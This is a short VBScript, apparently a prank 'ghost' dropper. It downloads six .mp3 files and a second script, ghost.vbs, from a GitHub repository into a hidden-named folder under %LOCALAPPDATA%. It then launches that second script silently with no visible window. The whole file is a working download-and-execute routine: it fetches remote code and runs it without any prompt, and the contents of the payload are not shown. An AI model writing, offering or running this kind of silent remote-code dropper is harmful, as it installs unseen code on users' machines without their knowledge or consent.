Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

ghostDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Ghost"
If Not fso.FolderExists(ghostDir) Then fso.CreateFolder(ghostDir)


call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s1.mp3", ghostDir & "\s1.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s2.mp3", ghostDir & "\s2.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s3.mp3", ghostDir & "\s3.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s4.mp3", ghostDir & "\s4.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s5.mp3", ghostDir & "\s5.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/s6.mp3", ghostDir & "\s6.mp3", 1)
call get_from_git("https://raw.githubusercontent.com/dakj0326/ghost/main/ghost.vbs", ghostDir & "\ghost.vbs", 2)


' ===================== Run ghost.vbs =========================

WScript.Sleep 2000 ' wait 2 seconds to ensure ghost.vbs has been saved
shell.Run "wscript.exe """ & ghostDir & "\ghost.vbs""", 0, False

' ============================================================

Sub get_from_git(url, path, t)
    Set x = CreateObject("MSXML2.XMLHTTP")
    Set stream = CreateObject("ADODB.Stream")

    x.Open "GET", url, False
    x.Send

    If x.Status = 200 Then
        If t = 1 Then
            ' Binary file (like .mp3)
            stream.Type = 1
            stream.Open
            stream.Write x.ResponseBody
        ElseIf t = 2 Then
            ' Text file (like .vbs)
            stream.Type = 2
            stream.Charset = "utf-8"
            stream.Open
            stream.WriteText x.ResponseText
        End If
        stream.SaveToFile path, 2
        stream.Close
    Else
        MsgBox "Download failed: " & url & vbCrLf & "HTTP status: " & x.Status, , "ghost"
    End If
End Sub
